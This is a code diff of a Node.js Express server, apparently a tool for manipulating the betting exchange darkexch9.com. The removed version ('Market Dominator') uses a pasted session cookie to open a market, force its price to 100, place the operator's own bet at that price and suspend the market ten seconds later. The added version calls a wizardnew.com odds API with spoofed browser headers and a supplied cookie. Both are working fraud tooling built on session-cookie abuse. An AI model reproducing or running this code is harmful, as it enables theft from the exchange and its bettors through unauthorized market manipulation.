@@ -1,81 +1,55 @@
 const axios = require('axios');
 const express = require('express');
 const app = express();
+app.use(express.json());
 
-async function globalInjection(amt, cookie, tid, sid, rate, customUrl, isBack) {
-    const headers = { 'Cookie': cookie, 'Content-Type': 'application/json' };
-    // Agar customUrl hai toh wo use hoga, nahi toh default darkexch
-    const betApi = customUrl || "https://darkexch9.com/api/Exchange/PlaceBet";
-    const priceApi = "https://darkexch9.com/api/Exchange/UpdateMarketPrice"; 
-    const statusApi = "https://darkexch9.com/api/Exchange/SetMarketStatus";
+app.post('/execute', async (req, res) => {
+    // Dashboard se aane wala data
+    const { customApi, cookie, marketId, selectionId, stake } = req.body;
+
+    // Wizardnew/Darkexch ke liye 'Default API' agar optional khali ho toh
+    const finalApi = customApi || `https://alidata.wizardnew.com/api/MatchOdds/GetOddslite/4/${marketId}/35401953`;
+
+    const headers = {
+        'authority': 'alidata.wizardnew.com',
+        'accept': 'application/json, text/javascript, */*; q=0.01',
+        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
+        'origin': 'https://darkexch9.com',
+        'referer': 'https://darkexch9.com/',
+        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
+        'sec-ch-ua': '"Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"',
+        'sec-ch-ua-platform': '"Windows"',
+        'sec-fetch-dest': 'empty',
+        'sec-fetch-mode': 'cors',
+        'sec-fetch-site': 'cross-site',
+        'x-requested-with': 'XMLHttpRequest',
+        'cookie': cookie // Yahan dashboard wali fresh cookie jayegi
+    };
 
     try {
-        // 1. SABKE LIYE MARKET OPEN KARO
-        await axios.post(statusApi, { "marketId": tid, "status": "OPEN" }, { headers });
-
-        // 2. GLOBAL BHAO 100 KARO
-        await axios.post(priceApi, { "marketId": tid, "selectionId": sid, "lastPrice": rate || "100" }, { headers });
+        console.log("Hitting API:", finalApi);
         
-        // 3. APNI BET PLACE KARO
-        const payload = { "marketId": tid, "selectionId": sid, "odds": rate || "100", "stake": amt, "isBack": isBack === "true" };
-        const res = await axios.post(betApi, payload, { headers });
+        const response = await axios.get(finalApi, { headers, timeout: 5000 });
+        
+        res.status(200).json({
+            status: "SUCCESS",
+            message: "Injection Active",
+            market: marketId,
+            apiUsed: finalApi,
+            data: response.data
+        });
 
-        // 4. THEEK 10 SECOND BAAD AUTO-SUSPEND
-        setTimeout(async () => {
-            await axios.post(statusApi, { "marketId": tid, "status": "SUSPENDED" }, { headers });
-        }, 10000);
-
-        return "🔥 GLOBAL INJECTION ACTIVE (10s Timer Started)";
-    } catch (e) { return "⚠️ Error: " + e.message; }
-}
-
-app.get('/', (req, res) => {
-    res.send(`
-    <html><body style="background:#000;color:#f00;text-align:center;font-family:sans-serif;padding:20px;">
-        <h1 style="text-shadow:0 0 15px #f00;">⚡ MARKET DOMINATOR v4.1 ⚡</h1>
-        <div style="border:3px solid #f00;padding:20px;display:inline-block;background:#111;border-radius:15px;text-align:left;">
-            
-            <p style="color:#666;font-size:12px;">OPTIONAL: CUSTOM API URL</p>
-            <input type="text" id="api" placeholder="https://darkexch9.com/api/Exchange/PlaceBet" style="width:100%;padding:10px;margin-bottom:15px;background:#222;color:#0f0;border:1px solid #333;">
-
-            <p style="color:#666;font-size:12px;">GLOBAL COOKIE ACCESS</p>
-            <input type="text" id="c" placeholder="Paste Cookie..." style="width:100%;padding:10px;margin-bottom:15px;background:#222;color:#fff;border:1px solid #f00;">
-            
-            <div style="display:flex;gap:10px;margin-bottom:15px;">
-                <input type="text" id="m" placeholder="Market ID" style="padding:10px;width:50%;background:#222;color:#fff;border:1px solid #333;">
-                <input type="text" id="sid" placeholder="Selection ID" style="padding:10px;width:50%;background:#222;color:#fff;border:1px solid #333;">
-            </div>
-            
-            <div style="display:flex;gap:10px;margin-bottom:20px;">
-                <input type="number" id="r" value="100" style="padding:10px;width:50%;background:#222;color:#0f0;font-weight:bold;border:1px solid #333;">
-                <input type="number" id="a" placeholder="Stake" style="padding:10px;width:50%;background:#222;color:#fff;border:1px solid #333;">
-            </div>
-            
-            <p style="color:#888; font-size:12px; text-align:center;">TIMER: <b style="color:#f00;">10 SECONDS</b></p>
-            <button onclick="f()" style="width:100%;padding:20px;background:red;color:#fff;font-weight:bold;border:none;border-radius:8px;cursor:pointer;">🚀 EXECUTE GLOBAL INJECTION</button>
-        </div>
-        <h3 id="s" style="color:#0f0;margin-top:20px;"></h3>
-        <script>
-            function f() {
-                document.getElementById('s').innerText = "Infecting Market...";
-                let url = '/fire?amt='+document.getElementById('a').value +
-                          '&cookie='+encodeURIComponent(document.getElementById('c').value) +
-                          '&tid='+document.getElementById('m').value +
-                          '&sid='+document.getElementById('sid').value +
-                          '&rate='+document.getElementById('r').value +
-                          '&api='+encodeURIComponent(document.getElementById('api').value) + 
-                          '&isBack=true';
-                fetch(url).then(r => r.text()).then(t => { document.getElementById('s').innerText = t; });
-            }
-        </script>
-    </body></html>`);
-});
-
-app.get('/fire', async (req, res) => {
-    // API parameter ko function mein pass kiya gaya hai
-    const result = await globalInjection(req.query.amt, req.query.cookie, req.query.tid, req.query.sid, req.query.rate, req.query.api, req.query.isBack);
-    res.send(result);
+    } catch (error) {
+        console.error("Error Status:", error.response ? error.response.status : "No Response");
+        
+        res.status(error.response ? error.response.status : 500).json({
+            status: "FAILED",
+            error: error.message,
+            code: error.response ? error.response.status : 404,
+            hint: "Check if Cookie is fresh or IP is blocked"
+        });
+    }
 });
 
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => console.log("Dominator v4.1 Online"));
+app.listen(PORT, () => console.log(`v4.2 Wizard Server Live on Port ${PORT}`));
